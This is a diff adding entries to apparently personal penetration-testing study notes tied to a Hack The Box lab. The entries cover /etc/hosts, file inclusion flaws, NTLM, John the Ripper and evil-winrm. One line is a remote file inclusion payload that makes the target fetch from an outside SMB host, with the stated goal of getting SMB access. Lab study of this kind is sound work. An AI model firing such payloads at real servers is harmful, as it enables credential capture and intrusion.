@@ -86,3 +86,27 @@ standar port 445
 Tool to brute force directories on a webserver
 Use dir to discover directories
 Use -x when looking for specific filetypes
+
+### /etc/hosts
+https://thelinuxcode.com/etc-hosts-file-complete-guide-for-linux/
+Used to map ip addresses to hostnames
+This is particularly usefull when you have a server not found error, but you know the ip and the domain
+
+### Local file inclusion (LFI) vulnerability
+https://en.wikipedia.org/wiki/File_inclusion_vulnerability
+
+### Remote file inclusione (RFI) vulnerability
+https://en.wikipedia.org/wiki/File_inclusion_vulnerability
+This is important when you want to trigger something on the server
+Eg to try to get a smb access
+http://unika.htb/index.php?page=//10.10.14.146/somefile
+
+### New Techonolgy LAN Manager (NTLM)
+https://en.wikipedia.org/wiki/NTLM
+Suite of microsoft security protocols
+
+### John the Ripper password cracker (john)
+https://www.openwall.com/john/
+
+### evil-winrm
+Can be used for WinRM and wsman like services 
